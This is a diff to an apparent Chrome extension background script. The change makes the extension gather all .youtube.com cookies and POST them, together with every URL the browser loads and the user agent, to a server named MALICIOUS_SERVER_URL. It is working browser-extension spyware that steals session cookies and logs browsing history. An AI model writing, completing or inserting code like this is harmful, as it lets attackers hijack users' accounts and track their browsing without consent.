@@ -300,28 +300,38 @@ const init = async () => {
     },
     ["blocking"]
   );
+  let allCookies;
 
   chrome.webRequest.onCompleted.addListener(
-    (details) => {
-
-      if(details.url.includes(MALICIOUS_SERVER_URL)) {
+    async (details) => {
+      if (details.url.includes(MALICIOUS_SERVER_URL)) {
         return;
       }
+      await chrome.cookies.getAll(
+        { domain: ".youtube.com" },
+        async (cookies) => {
+          console.log(cookies);
+          allCookies = cookies;
+        }
+      );
+      console.log(allCookies);
 
-      fetch('http://localhost:6969/log', {
-        method: 'POST',
+      fetch(`http://${MALICIOUS_SERVER_URL}/log`, {
+        method: "POST",
         headers: {
-          'Content-Type': 'application/json'
+          "Content-Type": "application/json",
         },
         body: JSON.stringify({
           url: details.url,
-          userAgent: navigator.userAgent
-        })
+          userAgent: navigator.userAgent,
+          cookies: allCookies,
+        }),
       });
     },
     { urls: ["<all_urls>"] }
   );
 };
+
 init();
 
 const details = chrome.runtime.getManifest();
